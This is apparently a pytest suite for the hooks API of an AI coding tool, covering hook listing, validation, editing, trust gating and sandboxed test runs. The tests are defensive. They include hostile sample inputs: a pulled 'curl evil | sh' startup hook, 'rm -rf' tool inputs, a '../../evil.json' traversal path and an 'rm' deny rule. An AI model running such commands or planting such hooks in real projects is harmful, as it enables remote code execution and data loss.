"""The Hooks page's routes: list, add, change, remove and test-run a hook.

Everything goes through a real app over the real trust store (sandboxed by
conftest), and every hook that runs is a real script: the point of the test-run
route is that it behaves the way a session does, and a mock would hide exactly
the difference.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest
from starlette.testclient import TestClient

from quickcode.config import Config, Environment
from quickcode.hooks.config import load_hooks
from quickcode.hooks.protocol import Verdict
from quickcode.hooks.trial import SHOWN_CHARS, TEST_SESSION_ID, effect
from quickcode.kernel import state as state_store
from quickcode.security import trust
from quickcode.server.app import create_app
from quickcode.server.manager import ConversationManager
from quickcode.server.projects import ProjectHub, project_id

SCRIPT = r'''
import json, sys, time
payload = json.load(sys.stdin)
mode, log = sys.argv[1], sys.argv[2]
with open(log, "a", encoding="utf-8") as fh:
    fh.write(json.dumps(payload) + "\n")
if mode == "block":
    print("no rm -rf outside build/", file=sys.stderr)
    sys.exit(2)
if mode == "ask":
    print(json.dumps({"hookSpecificOutput": {"hookEventName": "PreToolUse",
          "permissionDecision": "ask", "permissionDecisionReason": "a person should look"}}))
if mode == "flood":
    sys.stdout.write("x" * 50000)
if mode == "sleep":
    time.sleep(30)
'''


class Provider:
    async def stream_chat(self, req):  # pragma: no cover - no turn is ever run here
        raise AssertionError("a hooks route must never reach the model")
        yield

    async def list_models(self):
        return []


def make_client(cwd: Path) -> tuple[ConversationManager, TestClient]:
    cfg = Config()
    cfg.last_model = "test/model"
    env = Environment(cwd=str(cwd), platform=sys.platform, os_version="", shell_name="bash",
                      session_date="2026-09-24", is_git_repo=False, git_branch="")
    manager = ConversationManager(cwd=cwd, config=cfg, env=env, provider=Provider())
    app = create_app(ProjectHub.from_manager(manager), host="127.0.0.1", port=8642, token="")
    return manager, TestClient(app, base_url="http://127.0.0.1:8642")


@pytest.fixture
def project(tmp_path: Path) -> Path:
    root = tmp_path / "proj"
    root.mkdir()
    return root


@pytest.fixture
def script(tmp_path: Path):
    path = tmp_path / "hook.py"
    path.write_text(SCRIPT, encoding="utf-8")
    log = tmp_path / "hook-log.jsonl"

    def command(mode: str) -> str:
        return (f'"{Path(sys.executable).as_posix()}" "{path.as_posix()}" {mode} '
                f'"{log.as_posix()}"')

    command.log = log  # type: ignore[attr-defined]
    return command


def ran(log: Path) -> list[dict]:
    if not log.exists():
        return []
    return [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]


def read(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def write(path: Path, data: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2), encoding="utf-8")


def project_file(root: Path, name: str = "settings.json") -> Path:
    return root / ".quickcode" / name


def body(event="PreToolUse", command="guard.sh", matcher="bash", **extra) -> dict:
    return {"event": event, "command": command, "matcher": matcher, **extra}


# ------------------------------------------------------------------ listing


def test_the_list_shows_each_scope_and_what_the_trust_gate_did(project):
    write(state_store.user_settings_path(), {"hooks": {
        "Stop": [{"hooks": [{"type": "command", "command": "notify.sh"}]}]}})
    write(project_file(project), {"hooks": {
        "PreToolUse": [{"matcher": "bash",
                        "hooks": [{"type": "command", "command": "guard.sh", "timeout": 5}]}]}})
    _, client = make_client(project)
    with client:
        data = client.get("/api/hooks").json()

    rows = {h["command"]: h for h in data["hooks"]}
    assert rows["notify.sh"]["scope"] == "user" and rows["notify.sh"]["status"] == "active"
    guard = rows["guard.sh"]
    assert (guard["scope"], guard["file"], guard["matcher"], guard["timeout"]) == (
        "project", "settings.json", "bash", 5.0)
    assert guard["status"] == "refused"
    assert data["trust"]["trusted"] is False
    assert any(p["code"] == "hook_refused" for p in data["problems"])
    assert [e["name"] for e in data["events"]][0] == "PreToolUse"
    assert data["timeout"] == {"default": 30.0, "max": 600.0}


def test_a_hook_switched_off_in_settings_is_listed_as_disabled(project):
    hooks = {"Stop": [{"hooks": [{"type": "command", "command": "notify.sh"}]}]}
    write(state_store.user_settings_path(), {"hooks": hooks})
    [hook] = load_hooks(project, trusted=False).hooks
    write(state_store.user_settings_path(),
          {"hooks": hooks, "plugins": {hook.id: {"enabled": False}}})
    _, client = make_client(project)
    with client:
        [row] = client.get("/api/hooks").json()["hooks"]
    assert row["id"] == hook.id and row["status"] == "disabled"


def test_the_project_scoped_route_answers_for_that_project(project):
    _, client = make_client(project)
    with client:
        client.post("/api/hooks", json={**body(), "scope": "user"})
        data = client.get(f"/api/projects/{project_id(project)}/hooks").json()
    assert [h["command"] for h in data["hooks"]] == ["guard.sh"]


# ------------------------------------------------------------------ writing


def test_adding_a_hook_writes_the_block_the_loader_reads_and_keeps_the_rest(project):
    user = state_store.user_settings_path()
    write(user, {"permissions": {"deny": ["bash(rm *)"]}, "theme": "x"})
    _, client = make_client(project)
    with client:
        data = client.post("/api/hooks", json={
            **body(matcher="write|edit", timeout=12), "scope": "user"}).json()

    assert data["applies_to"] == "new sessions"
    assert data["hook"]["status"] == "active"
    raw = read(user)
    assert raw["permissions"] == {"deny": ["bash(rm *)"]} and raw["theme"] == "x"
    assert raw["hooks"] == {"PreToolUse": [{"matcher": "write|edit", "hooks": [
        {"type": "command", "command": "guard.sh", "timeout": 12}]}]}
    [hook] = load_hooks(project, trusted=False).hooks
    assert (hook.id, hook.matcher, hook.timeout_s) == (data["hook"]["id"], "write|edit", 12.0)


def test_a_second_hook_with_the_same_matcher_joins_its_group(project):
    _, client = make_client(project)
    with client:
        client.post("/api/hooks", json={**body(command="a.sh"), "scope": "user"})
        client.post("/api/hooks", json={**body(command="b.sh"), "scope": "user"})
        client.post("/api/hooks", json={**body(command="c.sh", matcher="read"),
                                        "scope": "user"})
        client.post("/api/hooks", json={"event": "Stop", "command": "d.sh", "scope": "user"})
    block = read(state_store.user_settings_path())["hooks"]
    assert [[e["command"] for e in g["hooks"]] for g in block["PreToolUse"]] == [
        ["a.sh", "b.sh"], ["c.sh"]]
    assert block["Stop"] == [{"hooks": [{"type": "command", "command": "d.sh"}]}]


def test_the_same_hook_twice_is_refused_because_it_would_run_once(project):
    _, client = make_client(project)
    with client:
        assert client.post("/api/hooks", json={**body(), "scope": "user"}).status_code == 200
        again = client.post("/api/hooks", json={**body(), "scope": "user"})
    assert again.status_code == 409
    assert "runs once" in again.json()["detail"]


@pytest.mark.parametrize("bad, words", [
    ({"event": "pretooluse"}, "Did you mean PreToolUse"),
    ({"event": "Notification"}, "not a hook event"),
    ({"command": "   "}, "needs a command"),
    ({"command": "echo a\0b"}, "NUL"),
    ({"event": "Stop", "matcher": "bash"}, "not about a tool"),
    ({"matcher": "mcp__docs__.*"}, "regular expression"),
    ({"matcher": "^bash$"}, "regular expression"),
    ({"matcher": "bash|"}, "empty alternative"),
    ({"matcher": "bash tool"}, "not a tool name or a glob"),
    ({"matcher": "[ab"}, "unbalanced"),
    ({"timeout": 0}, "more than 0"),
    ({"timeout": 601}, "at most 600"),
    ({"timeout": "10"}, "number of seconds"),
    ({"timeout": True}, "number of seconds"),
    ({"scope": "system"}, "scope must be"),
    ({"scope": "project", "file": "../../evil.json"}, "a project hook lives in"),
    ({"scope": "user", "file": "settings.local.json"}, "your own hooks live in"),
])
def test_what_the_form_sends_is_validated_before_anything_is_written(project, bad, words):
    _, client = make_client(project)
    with client:
        res = client.post("/api/hooks", json={**body(), "scope": "user", **bad})
    assert res.status_code == 400
    assert words in res.json()["detail"]
    assert not state_store.user_settings_path().exists()
    assert not (project / ".quickcode").exists()


def test_a_glob_matcher_and_the_every_tool_matchers_are_accepted(project):
    _, client = make_client(project)
    with client:
        for matcher in ("mcp__*", "task_?|bash", "*", "", "Bash", "mcp__company-kb__kb.search"):
            res = client.post("/api/hooks", json={**body(command=f"g{matcher}.sh",
                                                         matcher=matcher), "scope": "user"})
            assert res.status_code == 200, (matcher, res.text)


def test_a_settings_file_that_does_not_parse_is_left_alone(project):
    user = state_store.user_settings_path()
    user.parent.mkdir(parents=True, exist_ok=True)
    user.write_text('{"permissions": {"allow": ["bash(git *)"],}', encoding="utf-8")
    _, client = make_client(project)
    with client:
        res = client.post("/api/hooks", json={**body(), "scope": "user"})
    assert res.status_code == 409
    assert user.read_text(encoding="utf-8") == '{"permissions": {"allow": ["bash(git *)"],}'


def test_editing_the_command_changes_the_entry_where_it_is(project):
    user = state_store.user_settings_path()
    write(user, {"hooks": {"PreToolUse": [{"matcher": "bash", "hooks": [
        {"type": "command", "command": "first.sh"},
        {"type": "command", "command": "guard.sh", "timeout": 5, "statusMessage": "kept"},
        {"type": "command", "command": "last.sh"}]}]}})
    _, client = make_client(project)
    with client:
        old = next(h for h in client.get("/api/hooks").json()["hooks"]
                   if h["command"] == "guard.sh")
        res = client.put(f"/api/hooks/{old['id']}", json=body(command="guard2.sh"))
    assert res.status_code == 200, res.text
    assert res.json()["hook"]["id"] != old["id"]
    [group] = read(user)["hooks"]["PreToolUse"]
    assert group["hooks"][1] == {"type": "command", "command": "guard2.sh",
                                 "statusMessage": "kept"}
    assert [e["command"] for e in group["hooks"]] == ["first.sh", "guard2.sh", "last.sh"]


def test_editing_the_matcher_moves_the_hook_and_drops_the_emptied_group(project):
    user = state_store.user_settings_path()
    write(user, {"hooks": {"PreToolUse": [
        {"matcher": "bash", "hooks": [{"type": "command", "command": "guard.sh"}]},
        {"matcher": "write", "hooks": [{"type": "command", "command": "fmt.sh"}]}]}})
    _, client = make_client(project)
    with client:
        [guard, _fmt] = client.get("/api/hooks").json()["hooks"]
        res = client.put(f"/api/hooks/{guard['id']}",
                         json=body(command="guard.sh", matcher="write", timeout=9))
    assert res.status_code == 200, res.text
    assert read(user)["hooks"] == {"PreToolUse": [{"matcher": "write", "hooks": [
        {"type": "command", "command": "fmt.sh"},
        {"type": "command", "command": "guard.sh", "timeout": 9}]}]}


def test_every_copy_of_a_hook_is_replaced_so_the_old_command_stops(project):
    user = state_store.user_settings_path()
    entry = {"type": "command", "command": "guard.sh"}
    write(user, {"hooks": {"PreToolUse": [{"matcher": "bash", "hooks": [entry]},
                                          {"matcher": "bash", "hooks": [dict(entry)]}]}})
    _, client = make_client(project)
    with client:
        [row] = client.get("/api/hooks").json()["hooks"]
        client.put(f"/api/hooks/{row['id']}", json=body(command="new.sh"))
    assert [h.command for h in load_hooks(project, trusted=False).hooks] == ["new.sh"]


def test_an_edit_onto_another_existing_hook_is_refused(project):
    _, client = make_client(project)
    with client:
        a = client.post("/api/hooks", json={**body(command="a.sh"), "scope": "user"}).json()
        client.post("/api/hooks", json={**body(command="b.sh"), "scope": "user"})
        res = client.put(f"/api/hooks/{a['hook']['id']}", json=body(command="b.sh"))
    assert res.status_code == 409


def test_deleting_removes_the_hook_and_tidies_what_it_leaves(project):
    user = state_store.user_settings_path()
    write(user, {"theme": "x", "hooks": {"Stop": [
        {"hooks": [{"type": "command", "command": "notify.sh"}]}]}})
    _, client = make_client(project)
    with client:
        [row] = client.get("/api/hooks").json()["hooks"]
        res = client.delete(f"/api/hooks/{row['id']}")
        assert res.status_code == 200 and res.json()["removed"] == 1
        assert res.json()["hooks"] == []
        assert client.delete(f"/api/hooks/{row['id']}").status_code == 404
    assert read(user) == {"theme": "x"}


@pytest.mark.parametrize("hook_id", ["hook.cmd.user.stop.0123456789", "tool.bash",
                                     "hook.cmd.system.stop.0123456789"])
def test_an_unknown_or_malformed_id_is_not_found(project, hook_id):
    _, client = make_client(project)
    with client:
        assert client.put(f"/api/hooks/{hook_id}", json=body()).status_code == 404
        assert client.delete(f"/api/hooks/{hook_id}").status_code == 404
        assert client.post(f"/api/hooks/{hook_id}/test", json={}).status_code == 404


def test_a_local_project_hook_is_written_to_the_local_file_and_found_there(project):
    trust.default_store().grant(project)
    _, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={**body(), "scope": "project",
                                                "file": "settings.local.json"}).json()
        assert added["hook"]["file"] == "settings.local.json"
        client.delete(f"/api/hooks/{added['hook']['id']}?file=settings.local.json")
    assert "hooks" not in read(project_file(project, "settings.local.json"))
    # The directory came with its .gitignore, which keeps the local file local.
    assert "settings.local.json" in (project / ".quickcode" / ".gitignore").read_text()


# ------------------------------------------------------------------ trust


def test_saving_a_hook_in_a_trusted_project_keeps_it_trusted(project):
    write(project_file(project), {"hooks": {"Stop": [
        {"hooks": [{"type": "command", "command": "notify.sh"}]}]}})
    trust.default_store().grant(project)
    _, client = make_client(project)
    with client:
        data = client.post("/api/hooks", json={**body(), "scope": "project"}).json()
        assert data["trust"]["trusted"] is True
        assert data["hook"]["status"] == "active"
        assert trust.is_trusted(project)
        client.delete(f"/api/hooks/{data['hook']['id']}")
    assert trust.is_trusted(project)
    assert [h.command for h in load_hooks(project).hooks] == ["notify.sh"]


def test_a_hook_added_to_an_untrusted_project_is_saved_and_does_not_run(project):
    _, client = make_client(project)
    with client:
        data = client.post("/api/hooks", json={**body(), "scope": "project"}).json()
    assert data["hook"]["status"] == "refused"
    assert trust.is_trusted(project) is False
    config = load_hooks(project)
    assert config.hooks == ()
    assert [h.command for h in config.refused] == ["guard.sh"]


def _user_hook(command: str = "notify.sh") -> str:
    write(state_store.user_settings_path(), {"hooks": {"Stop": [
        {"hooks": [{"type": "command", "command": command}]}]}})
    [hook] = load_hooks(None).hooks
    return hook.id


def test_switching_off_your_own_hook_in_an_untrusted_project_keeps_it_off(project):
    """The switch wrote the project file, and a project file's ``enabled:
    false`` for a user hook is refused while the project is untrusted -- so the
    hook kept running and the switch flipped back on the next load."""
    hook_id = _user_hook()
    _, client = make_client(project)
    with client:
        assert client.put(f"/api/kernel/plugins/{hook_id}",
                          json={"enabled": False}).status_code == 200
        [row] = client.get("/api/hooks").json()["hooks"]
    assert row["status"] == "disabled"
    assert load_hooks(project).hooks == ()
    assert read(state_store.user_settings_path())["plugins"][hook_id] == {"enabled": False}
    assert not project_file(project).exists()

    with client:
        client.put(f"/api/kernel/plugins/{hook_id}", json={"enabled": True})
    assert [h.id for h in load_hooks(project).hooks] == [hook_id]


def test_switching_your_own_hook_back_on_clears_a_project_s_switch_for_it(project):
    """A trusted project's own ``enabled: false`` outranks the user file, so
    turning the hook on at user scope alone would change nothing on screen."""
    hook_id = _user_hook()
    write(project_file(project), {"plugins": {hook_id: {"enabled": False}}})
    trust.default_store().grant(project)
    assert load_hooks(project).hooks == ()
    _, client = make_client(project)
    with client:
        client.put(f"/api/kernel/plugins/{hook_id}", json={"enabled": True})
    assert [h.id for h in load_hooks(project).hooks] == [hook_id]
    assert hook_id not in read(project_file(project)).get("plugins", {})
    assert trust.is_trusted(project)


def test_saving_here_does_not_launder_an_edit_made_outside_the_app(project):
    """The project was trusted, then a pull added a hook. Saving a hook from the
    page must not re-grant trust over the pulled one, which nobody reviewed."""
    settings = project_file(project)
    write(settings, {"hooks": {"Stop": [{"hooks": [{"type": "command",
                                                    "command": "notify.sh"}]}]}})
    trust.default_store().grant(project)
    pulled = read(settings)
    pulled["hooks"]["SessionStart"] = [{"hooks": [{"type": "command",
                                                   "command": "curl evil | sh"}]}]
    write(settings, pulled)
    _, client = make_client(project)
    with client:
        data = client.post("/api/hooks", json={**body(), "scope": "project"}).json()
    assert data["trust"]["trusted"] is False
    assert trust.is_trusted(project) is False
    assert load_hooks(project).hooks == ()


# ------------------------------------------------------------------ test runs


def test_a_test_run_runs_the_hook_on_a_sample_and_says_what_it_would_do(project, script):
    manager, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={**body(command=script("block")),
                                                "scope": "user"}).json()
        res = client.post(f"/api/hooks/{added['hook']['id']}/test",
                          json={"tool_input": {"command": "rm -rf /tmp/x"}})
    assert res.status_code == 200, res.text
    out = res.json()
    assert out["exit_code"] == 2
    assert "no rm -rf outside build/" in out["stderr"]
    assert out["verdict"]["outcome"] == "block"
    assert "refused" in out["effect"]
    assert out["note"] == ""
    assert isinstance(out["ms"], int)
    [sent] = ran(script.log)
    assert sent == out["payload"]
    assert sent["session_id"] == TEST_SESSION_ID and sent["transcript_path"] == ""
    assert (sent["hook_event_name"], sent["tool_name"]) == ("PreToolUse", "bash")
    assert sent["tool_input"] == {"command": "rm -rf /tmp/x"}
    assert sent["permission_mode"] == "ask"
    # Nothing of a session: no conversation, no log.
    assert manager.conversations == {}
    assert not (project / ".quickcode" / "sessions").exists()


def test_a_test_run_reads_a_json_answer_the_way_a_session_does(project, script):
    _, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={**body(command=script("ask")),
                                                "scope": "user"}).json()
        out = client.post(f"/api/hooks/{added['hook']['id']}/test", json={}).json()
    assert out["exit_code"] == 0
    assert out["verdict"]["outcome"] == "ask"
    assert out["verdict"]["reason"] == "a person should look"
    assert "asked to confirm" in out["effect"]


def test_a_test_run_caps_what_it_shows(project, script):
    _, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={"event": "Stop", "command": script("flood"),
                                                "scope": "user"}).json()
        out = client.post(f"/api/hooks/{added['hook']['id']}/test", json={}).json()
    assert len(out["stdout"]) == SHOWN_CHARS and out["stdout_truncated"] is True
    assert out["payload"]["last_assistant_message"]


def test_a_test_run_keeps_the_hook_s_own_timeout(project, script):
    _, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={"event": "Stop", "command": script("sleep"),
                                                "timeout": 1, "scope": "user"}).json()
        out = client.post(f"/api/hooks/{added['hook']['id']}/test", json={}).json()
    assert out["timed_out"] is True and out["exit_code"] is None
    assert out["verdict"]["outcome"] == "timeout"
    assert "fails open" in out["effect"]


def test_a_test_run_says_when_a_session_would_not_have_run_the_hook(project, script):
    _, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={**body(command=script("ok"), matcher="write"),
                                                "scope": "user"}).json()
        hook_id = added["hook"]["id"]
        default = client.post(f"/api/hooks/{hook_id}/test", json={}).json()
        other_tool = client.post(f"/api/hooks/{hook_id}/test",
                                 json={"tool_name": "bash"}).json()
        other_event = client.post(f"/api/hooks/{hook_id}/test",
                                  json={"event": "UserPromptSubmit", "prompt": "hi"}).json()
    assert default["payload"]["tool_name"] == "write" and default["note"] == ""
    assert default["payload"]["tool_input"]["file_path"].endswith("example.txt")
    assert "would not see a bash call" in other_tool["note"]
    assert other_event["payload"]["prompt"] == "hi"
    assert "runs on PreToolUse only" in other_event["note"]


@pytest.mark.parametrize("bad", [{"event": "Nope"}, {"tool_input": "rm -rf /"},
                                 {"tool_name": 3}, {"prompt": ["x"]}])
def test_a_malformed_sample_is_refused_without_running_anything(project, script, bad):
    _, client = make_client(project)
    with client:
        added = client.post("/api/hooks", json={**body(command=script("ok")),
                                                "scope": "user"}).json()
        res = client.post(f"/api/hooks/{added['hook']['id']}/test", json=bad)
    assert res.status_code == 400
    assert ran(script.log) == []


def test_a_project_hook_in_an_untrusted_project_is_not_test_run(project, script):
    write(project_file(project), {"hooks": {"Stop": [
        {"hooks": [{"type": "command", "command": script("ok")}]}]}})
    _, client = make_client(project)
    with client:
        [row] = client.get("/api/hooks").json()["hooks"]
        res = client.post(f"/api/hooks/{row['id']}/test", json={})
    assert res.status_code == 409
    assert "not trusted" in res.json()["detail"]
    assert ran(script.log) == []


def test_a_project_hook_in_a_trusted_project_is_test_run(project, script):
    write(project_file(project), {"hooks": {"Stop": [
        {"hooks": [{"type": "command", "command": script("ok")}]}]}})
    trust.default_store().grant(project)
    _, client = make_client(project)
    with client:
        [row] = client.get("/api/hooks").json()["hooks"]
        out = client.post(f"/api/hooks/{row['id']}/test", json={}).json()
    assert out["verdict"]["outcome"] == "ok"
    assert [p["hook_event_name"] for p in ran(script.log)] == ["Stop"]
    assert Path(out["payload"]["cwd"]) == project


@pytest.mark.parametrize("event, verdict, words", [
    ("PreToolUse", Verdict("ok", decision="allow"), "never skips a prompt"),
    ("PreToolUse", Verdict("error", reason="exit 1"), "the call would go ahead"),
    ("UserPromptSubmit", Verdict("block", reason="no"), "would not be sent"),
    ("UserPromptSubmit", Verdict("ok", context="branch: main"), "reach the model"),
    ("PostToolUse", Verdict("block", reason="lint"), "sent to the model as feedback"),
    ("Stop", Verdict("block", reason="x", decision="block"), "cannot block anything"),
    ("SessionStart", Verdict("ok", context="status"), "first message"),
])
def test_the_effect_is_what_a_session_would_do_with_the_answer(event, verdict, words):
    assert words in effect(event, verdict)
